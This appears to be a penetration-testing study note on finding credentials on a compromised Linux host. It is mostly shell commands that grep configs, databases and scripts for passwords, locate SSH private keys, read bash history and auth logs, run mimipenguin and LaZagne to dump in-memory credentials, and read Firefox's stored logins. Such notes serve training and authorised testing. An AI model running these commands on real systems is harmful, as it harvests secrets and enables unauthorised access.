We can search for passwords or even whole credentials that we can use escalate our privileges. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys||
### Files
##### Configuration Files
Searching for configuration files (`.conf`,`.config`,`.cnf`)
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
Search for credentials in file type (configuration files)
```bash
for i in $(find / -name *.config 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" --color=auto $i 2>/dev/null | grep -v "\#";done
```
##### Databases
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

```bash
for i in $(find / -name *.db 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" --color=auto $i 2>/dev/null | grep -v "\#";done
```
##### Notes
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
##### Scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
##### Cronjobs
```bash
cat /etc/crontab 
ls -la /etc/cron.*/
```
##### SSH Keys
```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
### Logs
##### History
```bash
tail -n5 /home/*/.bash*
```

The entirety of log files can be divided into four categories:

| **Application Logs** | **Event Logs** | **Service Logs** | **System Logs** |
| -------------------- | -------------- | ---------------- | --------------- |
Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
Analysis in logs
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Memory and Cache
Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.
#### Mimipenguin
In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
```bash
sudo python3 mimipenguin.py
sudo python3 mimipenguin.sh
```
#### Lazagne
```bash
sudo python2.7 laZagne.py all
```
#### Browsers
Firefox stored credentials
```shell
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
[Firefox Decrypt](https://github.com/unode/firefox_decrypt) can be used for decrypting these credentials